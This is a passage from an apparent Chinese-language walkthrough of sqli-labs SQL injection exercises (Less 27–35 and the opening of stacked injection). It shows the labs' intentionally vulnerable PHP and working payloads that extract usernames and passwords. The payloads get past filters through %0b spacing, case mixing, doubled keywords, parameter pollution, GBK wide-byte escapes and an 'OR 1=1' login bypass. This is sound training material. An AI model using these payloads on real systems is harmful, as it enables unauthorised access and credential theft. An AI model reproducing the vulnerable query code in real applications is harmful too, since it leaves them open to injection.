    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Select/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Strip out select</span>
    <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1"</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"%0b"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"UNION"</span><span class="token punctuation">,</span> <span class="token string">"UNiON"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"SEleCT"</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L27a</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">'?id=x" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE "1"="1'</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"%0b"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"UNION"</span><span class="token punctuation">,</span> <span class="token string">"UNiON"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"SEleCT"</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L28</h3><p class="x-p">注意<code class="x-inline-highlight">%0b</code>绕过了正则<code class="x-inline-highlight">\s</code>的判断。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//strip out /*</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//Strip out --.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//Strip out #.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//Strip out spaces.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union\s+select/i'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//Strip out UNION &amp; SELECT.</span>
    <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id=('<span class="token interpolation"><span class="token variable">$id</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1"</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"%0b"</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L28a</h3><p class="x-p">过滤条件跟L28比变少了，只剩这一个：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union\s+select/i'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div><p class="x-p">双写过滤的思路：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=x') UNION UNION SELECT SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1"</span></code></pre></div><h2 class="x-h1">WAF：L29-L31</h2><p class="x-p">这三个Lab只有闭合方式不一样，核心思路是一样的，因此放到一起说。</p><p class="x-p">服务端模拟了一个HPP<code class="x-inline-highlight">(HTTP Parameter Pollution)</code>的场景：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 816px, var(--bg-transparent-golden) 816px 864px, transparent 864px, transparent 888px, var(--bg-transparent-golden) 888px 936px, transparent 936px)"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">// WAF implementation with a whitelist approach, only allows input to be numeric.</span>
<span class="token keyword">function</span> <span class="token function-definition function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$match</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^\d+$/"</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// ... input is valid</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// ... input is invalid</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: hacked.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span>
<span class="token keyword">function</span> <span class="token function-definition function">java_implementation</span><span class="token punctuation">(</span><span class="token variable">$query_string</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$q_s</span> <span class="token operator">=</span> <span class="token variable">$query_string</span><span class="token punctuation">;</span>
    <span class="token variable">$qs_array</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span> <span class="token variable">$q_s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$qs_array</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$val</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"id"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$id_value</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$id_value</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// ...</span>

<span class="token variable">$qs</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"QUERY_STRING"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id1</span> <span class="token operator">=</span> <span class="token function">java_implementation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$id1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">java_implementation</code>模拟了一个存在漏洞的WAF的行为，当传入的参数重复时（<code class="x-inline-highlight">?id=1&id=2</code>），WAF取第一个参数值<code class="x-inline-highlight">1</code>进行检查，而最后一个参数值<code class="x-inline-highlight">2</code>会被用于后续的SQL查询。</p><p class="x-p">三个Lab只有闭合方式不一样，<code class="x-inline-highlight">payload</code>依次为：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=1&amp;id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- "</span></code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">'?id=1&amp;id=x" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '</span></code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">'?id=1&amp;id=x") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '</span></code></pre></div><p class="x-p">注意这三个Lab使用<code class="x-inline-highlight">login.php</code>文件。</p><h2 class="x-h1">宽字节注入：L32-L37</h2><h3 class="x-h2">前言 &amp; 笔记</h3><p class="x-p">宽字节注入需要服务端使用了某些特定的字符集（如GBK）来解析请求参数，利用服务器解析两个字节的特性“吃掉”一个转义字符。</p><p class="x-p">具体来说，L32-L37服务端都设置了：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div><p class="x-p">同时服务端对输入的<code class="x-inline-highlight">'</code>和<code class="x-inline-highlight">&#92;</code>都进行了转义。当需要闭合一个单引号时，考虑对服务器输入<code class="x-inline-highlight">%df%27</code>：</p><div class="x-table-wrapper"><table class="x-table"><tbody><tr><th></th><th>Byte 1</th><th>Byte 2</th><th>Byte 3</th></tr><tr><td>输入</td><td><p class="x-p"><code class="x-inline-highlight">0xdf</code></p></td><td><p class="x-p"><code class="x-inline-highlight">0x27</code> (<code class="x-inline-highlight">'</code>)</p></td><td></td></tr><tr><td>经过服务端转义</td><td><p class="x-p"><code class="x-inline-highlight">0xdf</code></p></td><td><p class="x-p"><code class="x-inline-highlight">0x5c</code> (<code class="x-inline-highlight">&#92;</code>)</p></td><td><p class="x-p"><code class="x-inline-highlight">0x27</code> (<code class="x-inline-highlight">'</code>)</p></td></tr><tr><td>SQL解析</td><td colSpan="2"><p class="x-p"><code class="x-inline-highlight">0xdf5c</code> (<code class="x-inline-highlight">運</code>)</p></td><td><p class="x-p"><code class="x-inline-highlight">0x27</code> (<code class="x-inline-highlight">'</code>)</p></td></tr></tbody></table></div><p class="x-p">宽字节注入就是利用GBK编码将两个字节（<code class="x-inline-highlight">0xdf</code>，<code class="x-inline-highlight">0x5c</code>）解析为一个汉字字符（<code class="x-inline-highlight">運</code>），从而“吃掉”了转义字符（<code class="x-inline-highlight">&#92;</code>），使得后续的单引号得以闭合。</p><img alt="img" loading="lazy" width="764" height="438" decoding="async" data-nimg="1" class="x-image x-image-invert" style="color:transparent;height:auto" src="/_next/static/media/gbk1.f600a4da.jpg"/><p class="x-p">很多文章中的例子都使用<code class="x-inline-highlight">%df</code>进行注入，实际上这只是众多选择中的一个。GBK编码范围如下图所示，只要第一个字节在编码范围中就可以了。</p><img alt="img" loading="lazy" width="511" height="375" decoding="async" data-nimg="1" class="x-image x-image-invert" style="color:transparent;height:auto" src="/_next/static/media/gbk2.26d3dca0.jpg"/><h3 class="x-h2">L32、L33、L36</h3><p class="x-p">服务端用了不同的转义函数（<code class="x-inline-highlight">preg_replace</code>、<code class="x-inline-highlight">addslashes</code>、<code class="x-inline-highlight">mysql_real_escape_string</code>），但是注入方式相同：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=%df' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- "</span></code></pre></div><h3 class="x-h2">L34、L37</h3><p class="x-p">同样是服务端用了不同的转义函数（<code class="x-inline-highlight">addslashes</code>和<code class="x-inline-highlight">mysql_real_escape_string</code>），但不影响注入方式：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"%df' OR 1=1 -- "</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span>
    <span class="token string">"Less-34"</span><span class="token punctuation">,</span> <span class="token comment"># "Less-37"</span>
    data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"uname=</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string">&amp;passwd=x"</span></span><span class="token punctuation">,</span>
    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span>
<span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L35</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre></div><p class="x-p">这题的意思是，既然服务端没有给<code class="x-inline-highlight">id</code>加引号，那我们就不需要闭合引号了，也没必要用宽字节注入了：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- "</span></code></pre></div><h2 class="x-h1">堆叠注入：L38-L45</h2><h3 class="x-h2">前言 &amp; 笔记</h3><p class="x-p">前面的所有Lab都是基于单条SQL语句的注入，服务端使用<code class="x-inline-highlight">mysql_query($sql);</code>执行SQL语句。</p><p class="x-p">而堆叠注入则是利用数据库支持在同一个请求中执行多条SQL语句的特性进行注入，不同语句之间用分号<code class="x-inline-highlight">;</code>分隔。这需要用到<code class="x-inline-highlight">mysqli_multi_query</code>等函数。</p><p class="x-p">下面是来自PHP手册的一段代码示例：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mysqli_report</span><span class="token punctuation">(</span><span class="token class-name">MYSQLI_REPORT_ERROR</span> <span class="token operator">|</span> <span class="token class-name">MYSQLI_REPORT_STRICT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_user"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"my_password"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT CURRENT_USER();"</span><span class="token punctuation">;</span>
<span class="token variable">$query</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"SELECT Name FROM City ORDER BY ID LIMIT 20, 5"</span><span class="token punctuation">;</span>

<span class="token comment">/* execute multi query */</span>
